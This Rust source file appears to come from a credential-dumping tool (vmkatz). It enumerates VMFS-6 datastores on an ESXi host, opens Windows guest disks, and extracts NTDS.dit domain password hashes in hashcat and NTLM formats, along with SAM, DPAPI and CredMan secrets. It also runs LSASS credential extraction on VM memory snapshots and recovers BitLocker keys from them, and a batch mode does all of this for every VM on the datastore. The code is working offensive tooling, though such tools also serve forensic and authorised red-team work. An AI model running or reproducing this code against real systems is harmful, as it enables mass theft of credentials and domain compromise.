//! VMFS datastore enumeration, disk selection and associated snapshot handling.

use std::path::Path;

#[cfg(feature = "ntds.dit")]
use anyhow::Context;

use crate::cli::args::{Args, Colors, get_colors};
#[cfg(feature = "ntds.dit")]
use crate::cli::credentials::emit_disk_extras;
#[cfg(all(feature = "sam", feature = "vmware"))]
use crate::cli::lsass::extract_bitlocker_keys_from_snapshot;
#[cfg(feature = "vmware")]
use crate::cli::lsass::run_lsass;
#[cfg(feature = "ntds.dit")]
use crate::cli::output::{
    print_disk_secrets, print_ntds_brief, print_ntds_csv, print_ntds_hashcat, print_ntds_ntlm,
    print_ntds_text,
};

#[cfg(feature = "ntds.dit")]
use super::read_ntds_stream;
use super::{extract_and_print_reader, run_cp, run_ls};

/// Probe actual NTFS/BitLocker volume signatures, including on GPT disks.
fn has_ntfs_partitions<R: std::io::Read + std::io::Seek>(reader: &mut R) -> bool {
    let Ok(pos) = reader.stream_position() else {
        return false;
    };
    let found = vmkatz::fs::find_ntfs_partitions(reader).is_ok_and(|parts| !parts.is_empty());
    if let Err(e) = reader.seek(std::io::SeekFrom::Start(pos)) {
        log::debug!("NTFS probe could not restore reader position: {e}");
        return false;
    }
    found
}

/// List available VMFS-6 devices and their flat VMDKs.
pub fn run_vmfs_list(device_filter: Option<&str>) {
    use vmkatz::disk::vmfs;

    let devices = vmfs::list_vmfs6_devices();
    if devices.is_empty() {
        eprintln!("[!] No VMFS-6 devices found in /dev/disks/");
        eprintln!("    (Are you running this on an ESXi host?)");
        return;
    }

    eprintln!("[+] VMFS-6 devices:");
    for dev in &devices {
        let label = if dev.label.is_empty() {
            "(unlabeled)".to_string()
        } else {
            dev.label.clone()
        };
        eprintln!("    {} — {}", dev.path.display(), label);
    }

    let targets: Vec<_> = if let Some(filter) = device_filter {
        let filter_path = std::path::Path::new(filter);
        devices.iter().filter(|d| d.path == filter_path).collect()
    } else {
        devices.iter().collect()
    };

    for dev in &targets {
        let label = if dev.label.is_empty() {
            dev.path.display().to_string()
        } else {
            dev.label.clone()
        };
        match vmfs::list_vmfs6_vmdks(&dev.path) {
            Ok(vmdks) => {
                eprintln!("\n[+] {} — {} flat VMDKs:", label, vmdks.len());
                for (vm, vmdk) in &vmdks {
                    println!(
                        "--vmfs-device {} --vmdk '{}/{}'",
                        dev.path.display(),
                        vm,
                        vmdk
                    );
                }
            }
            Err(e) => {
                eprintln!("[!] {}: {}", dev.path.display(), e);
            }
        }
    }
}

/// Extract NTDS, then DPAPI, from a VMFS-backed disk.
#[cfg(feature = "ntds.dit")]
fn vmfs_emit_ntds<R: std::io::Read + std::io::Seek>(
    disk: &mut R,
    args: &Args,
    c: &Colors,
    fvek_keys: &[vmkatz::lsass::bitlocker::BitLockerKey],
) -> anyhow::Result<()> {
    // Reuse local secrets for DPAPI/CredMan; --all also prints them.
    let secrets = if args.credman || args.all {
        if fvek_keys.is_empty() {
            vmkatz::sam::extract_secrets_from_reader_scoped(disk, args.partition).ok()
        } else {
            vmkatz::sam::extract_disk_secrets_from_reader_with_bitlocker(
                disk,
                fvek_keys,
                args.partition,
            )
            .ok()
        }
    } else {
        None
    };
    if args.all {
        if let Some(s) = &secrets {
            print_disk_secrets(s, args);
        }
    }

    let artifacts_result = read_ntds_stream(disk, args, fvek_keys);
    let artifacts = match artifacts_result {
        Ok(artifacts) => artifacts,
        Err(error) if args.all => {
            eprintln!("[!] NTDS extraction skipped: {error}");
            emit_disk_extras(disk, args, c, secrets.as_ref(), &[]);
            return Ok(());
        }
        Err(error) => return Err(error).context("NTDS artifact extraction failed"),
    };
    let (ctx, hashes) = artifacts.output.context("NTDS hash extraction failed")?;

    eprintln!("\n{}[+] NTDS Artifacts:{}", c.green, c.reset);
    eprintln!("  Partition offset : 0x{:x}", artifacts.partition_offset);
    eprintln!("  ntds.dit size    : {} bytes", ctx.ntds_size);
    eprintln!("  SYSTEM size      : {} bytes", artifacts.system_size);
    eprintln!("  Bootkey          : {}", hex::encode(ctx.boot_key));
    eprintln!("  Hashes extracted : {}", hashes.len());

    match args.format.as_str() {
        "csv" => print_ntds_csv(&hashes, args.ntds_domain_prefix.as_deref()),
        "hashcat" => print_ntds_hashcat(&hashes, args.ntds_domain_prefix.as_deref()),
        "ntlm" => print_ntds_ntlm(&hashes, args.ntds_domain_prefix.as_deref()),
        "brief" => print_ntds_brief(&hashes, args.ntds_domain_prefix.as_deref()),
        _ => print_ntds_text(&hashes, c, args.ntds_domain_prefix.as_deref()),
    }

    // CredMan needs this disk's NTDS hashes to unlock domain users' masterkeys.
    let ntds_by_name: Vec<(String, [u8; 16])> = if args.credman || args.all {
        hashes
            .iter()
            .filter(|h| !h.is_history)
            .map(|h| (h.username.clone(), h.nt_hash))
            .collect()
    } else {
        Vec::new()
    };
    emit_disk_extras(disk, args, c, secrets.as_ref(), &ntds_by_name);
    Ok(())
}

/// Find sibling snapshots by datastore label, or by an unambiguous VM directory.
#[cfg(feature = "vmware")]
fn vmfs_associated_snapshots(device_path: &Path, vmdk_path: &str) -> Vec<std::path::PathBuf> {
    use vmkatz::discover::discover_vm_files;
    use vmkatz::disk::vmfs;

    let relative = Path::new(vmdk_path);
    let Some(vm_relative_dir) = relative.parent() else {
        return Vec::new();
    };
    let Some(vmdk_name) = relative.file_name() else {
        return Vec::new();
    };

    let datastore_label = vmfs::list_vmfs6_devices()
        .into_iter()
        .find(|device| device.path == device_path)
        .map(|device| device.label);
    let Ok(volumes) = std::fs::read_dir("/vmfs/volumes") else {
        return Vec::new();
    };

    let mut matching_dirs = Vec::new();
    for volume in volumes.flatten() {
        if let Some(label) = datastore_label.as_deref() {
            if volume.file_name().to_string_lossy() != label {
                continue;
            }
        }
        let vm_dir = volume.path().join(vm_relative_dir);
        if vm_dir.join(vmdk_name).is_file() && vm_dir.is_dir() {
            matching_dirs.push(vm_dir);
        }
    }

    if matching_dirs.len() != 1 {
        if !matching_dirs.is_empty() {
            log::warn!(
                "VMFS: {} mounted VM directories match {}; refusing ambiguous snapshot association",
                matching_dirs.len(),
                vmdk_path
            );
        }
        return Vec::new();
    }

    let vm_dir = &matching_dirs[0];
    let Ok(discovery) = discover_vm_files(vm_dir) else {
        return Vec::new();
    };
    discovery.lsass_files
}

#[cfg(all(feature = "sam", feature = "vmware"))]
fn vmfs_snapshot_bitlocker_keys(
    disk: &mut (impl std::io::Read + std::io::Seek),
    snapshots: &[std::path::PathBuf],
) -> Vec<vmkatz::lsass::bitlocker::BitLockerKey> {
    // Avoid costly RAM scans unless the disk contains a BitLocker volume.
    let Ok(partitions) = vmkatz::fs::find_ntfs_partitions(disk) else {
        return Vec::new();
    };
    if !partitions
        .iter()
        .any(|&offset| vmkatz::fs::is_bitlocker_partition(disk, offset))
    {
        return Vec::new();
    }

    let mut snapshots = snapshots.to_vec();
    snapshots.sort_by_key(|path| {
        std::fs::metadata(path)
            .and_then(|metadata| metadata.modified())
            .ok()
    });
    snapshots.reverse();
    for snapshot in snapshots {
        let candidates = extract_bitlocker_keys_from_snapshot(&snapshot);
        if !candidates.is_empty() {
            log::info!(
                "BitLocker: {} FVEK candidate(s) from associated snapshot {}",
                candidates.len(),
                snapshot.display()
            );
            return candidates;
        }
    }
    Vec::new()
}

#[cfg(feature = "vmware")]
fn vmfs_run_associated_lsass(snapshots: &[std::path::PathBuf], args: &Args) -> anyhow::Result<()> {
    if snapshots.is_empty() {
        anyhow::bail!("No memory snapshots were found beside the associated VMFS VMDK");
    }
    for snapshot in snapshots {
        let name = snapshot.file_name().unwrap_or_default().to_string_lossy();
        eprintln!("\n[*] LSASS snapshot: {name}");
        if let Err(error) = run_lsass(snapshot, args, None, None) {
            eprintln!("[!] {name}: {error:#}");
        }
    }
    Ok(())
}

#[cfg(not(feature = "vmware"))]
fn vmfs_run_associated_lsass(
    _snapshots: &[std::path::PathBuf],
    _args: &Args,
) -> anyhow::Result<()> {
    anyhow::bail!("VMFS-associated LSASS extraction requires the vmware feature")
}

#[cfg(not(all(feature = "sam", feature = "vmware")))]
const fn vmfs_snapshot_bitlocker_keys(
    _disk: &mut (impl std::io::Read + std::io::Seek),
    _snapshots: &[std::path::PathBuf],
) -> Vec<vmkatz::lsass::bitlocker::BitLockerKey> {
    Vec::new()
}

#[cfg(not(feature = "vmware"))]
const fn vmfs_associated_snapshots(
    _device_path: &Path,
    _vmdk_path: &str,
) -> Vec<std::path::PathBuf> {
    Vec::new()
}

pub fn run_vmfs(device_path: &Path, vmdk_path: Option<&str>, args: &Args) -> anyhow::Result<()> {
    let colors = get_colors(args);
    match vmdk_path {
        Some(vmdk) => run_vmfs_single(device_path, vmdk, args, colors),
        None => run_vmfs_scan(device_path, args, colors),
    }
}

fn run_vmfs_single(
    device_path: &Path,
    vmdk: &str,
    args: &Args,
    c: &'static Colors,
) -> anyhow::Result<()> {
    use vmkatz::disk::DiskImage;
    use vmkatz::disk::vmfs;

    eprintln!(
        "{}[*] VMFS-6: Opening {} from {}{}",
        c.cyan,
        vmdk,
        device_path.display(),
        c.reset
    );
    let mut disk = vmfs::open_vmfs6_vmdk(device_path, vmdk)
        .map_err(|e| anyhow::anyhow!("VMFS open failed: {e}"))?;
    if args.partition.is_none() && !has_ntfs_partitions(&mut disk) {
        anyhow::bail!("{vmdk}: no NTFS/BitLocker volume detected");
    }
    let associated_snapshots = vmfs_associated_snapshots(device_path, vmdk);
    if args.lsass || (args.all && !associated_snapshots.is_empty()) {
        vmfs_run_associated_lsass(&associated_snapshots, args)?;
    }
    let bitlocker_keys = vmfs_snapshot_bitlocker_keys(&mut disk, &associated_snapshots);

    eprintln!(
        "{}[+] VMDK opened: {:.1} GB{}",
        c.green,
        disk.disk_size() as f64 / (1024.0 * 1024.0 * 1024.0),
        c.reset
    );

    if let Some(cp) = &args.cp {
        return run_cp(&mut disk, &cp[0], &cp[1], args.partition);
    }

    if let Some(ref ls_path) = args.ls {
        return run_ls(&mut disk, ls_path, args.partition);
    }

    // The NTDS path also handles local secrets for --all.
    #[cfg(feature = "ntds.dit")]
    if args.ntds || args.all {
        return vmfs_emit_ntds(&mut disk, args, c, &bitlocker_keys);
    }

    extract_and_print_reader(&mut disk, args, c, &bitlocker_keys, false)?;
    Ok(())
}

fn run_vmfs_scan(device_path: &Path, args: &Args, c: &'static Colors) -> anyhow::Result<()> {
    use vmkatz::disk::vmfs;

    // A partition offset applies to one explicit VMDK, not a batch of disks.
    if args.partition.is_some() {
        anyhow::bail!(
            "--partition requires --vmdk: a partition offset applies to one disk, not an \
                 auto-scan of all VMDKs. Select a disk with --vmdk (see --vmfs-list)."
        );
    }
    if args.cp.is_some() {
        anyhow::bail!(
            "--cp requires --vmdk: a file copy targets one disk, not an auto-scan of all \
                 VMDKs. Select a disk with --vmdk (see --vmfs-list)."
        );
    }
    eprintln!(
        "{}[*] VMFS-6: Scanning all VMs on {}{}",
        c.cyan,
        device_path.display(),
        c.reset
    );

    let vmdks = vmfs::list_vmfs6_vmdks(device_path)
        .map_err(|e| anyhow::anyhow!("VMFS scan failed: {e}"))?;

    if vmdks.is_empty() {
        anyhow::bail!("No flat VMDKs found on VMFS-6 datastore");
    }

    eprintln!("[+] Found {} flat VMDKs:", vmdks.len());
    for (vm, vmdk) in &vmdks {
        eprintln!("    {vm}/{vmdk}");
    }

    let mut processed_snapshots = std::collections::HashSet::new();
    for (vm_name, vmdk_name) in &vmdks {
        let vmdk_path = format!("{vm_name}/{vmdk_name}");
        eprintln!("\n{}[*] Processing: {}{}", c.cyan, vmdk_path, c.reset);

        match vmfs::open_vmfs6_vmdk(device_path, &vmdk_path) {
            Ok(mut disk) => {
                // Skip non-Windows disks before opening their costly memory snapshots.
                if !has_ntfs_partitions(&mut disk) {
                    eprintln!(
                        "[*] {vm_name}: no Windows-compatible partition layout detected; skipping this VM (common for Linux guests)"
                    );
                    continue;
                }
                let associated_snapshots = vmfs_associated_snapshots(device_path, &vmdk_path);
                if args.lsass || args.all {
                    let new_snapshots: Vec<_> = associated_snapshots
                        .iter()
                        .filter(|snapshot| processed_snapshots.insert((*snapshot).clone()))
                        .cloned()
                        .collect();
                    if !new_snapshots.is_empty() {
                        vmfs_run_associated_lsass(&new_snapshots, args)?;
                    }
                }
                let bitlocker_keys = vmfs_snapshot_bitlocker_keys(&mut disk, &associated_snapshots);
                if let Some(ref ls_path) = args.ls {
                    println!("=== {vmdk_path} ===");
                    if let Err(e) = run_ls(&mut disk, ls_path, args.partition) {
                        eprintln!("[!] {vm_name}: {e}");
                    }
                    continue;
                }
                #[cfg(feature = "ntds.dit")]
                if args.ntds || args.all {
                    println!("=== {vmdk_path} ===");
                    if let Err(e) = vmfs_emit_ntds(&mut disk, args, c, &bitlocker_keys) {
                        eprintln!("[!] {vm_name}: {e:#}");
                    }
                    continue;
                }
                // Batch mode never attempts raw registry recovery.
                if let Err(e) = extract_and_print_reader(&mut disk, args, c, &bitlocker_keys, true)
                {
                    eprintln!("[!] {vm_name}: {e}");
                }
            }
            Err(e) => {
                eprintln!("[!] Failed to open {vmdk_path}: {e}");
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    #[test]
    fn vmfs_probe_does_not_treat_every_gpt_disk_as_windows() {
        let mut bytes = vec![0u8; 8192];
        bytes[510..512].copy_from_slice(&[0x55, 0xAA]);
        bytes[0x1BE + 4] = 0xEE;
        bytes[512..520].copy_from_slice(b"EFI PART");
        bytes[512 + 0x48..512 + 0x50].copy_from_slice(&2u64.to_le_bytes());
        bytes[512 + 0x50..512 + 0x54].copy_from_slice(&1u32.to_le_bytes());
        bytes[512 + 0x54..512 + 0x58].copy_from_slice(&128u32.to_le_bytes());
        bytes[1024..1040].fill(0x11);
        bytes[1024 + 0x20..1024 + 0x28].copy_from_slice(&8u64.to_le_bytes());
        let mut reader = std::io::Cursor::new(bytes);
        reader.set_position(23);
        assert!(!super::has_ntfs_partitions(&mut reader));
        assert_eq!(reader.position(), 23);
        reader.get_mut()[4099..4107].copy_from_slice(b"NTFS    ");
        assert!(super::has_ntfs_partitions(&mut reader));
        assert_eq!(reader.position(), 23);
    }
}
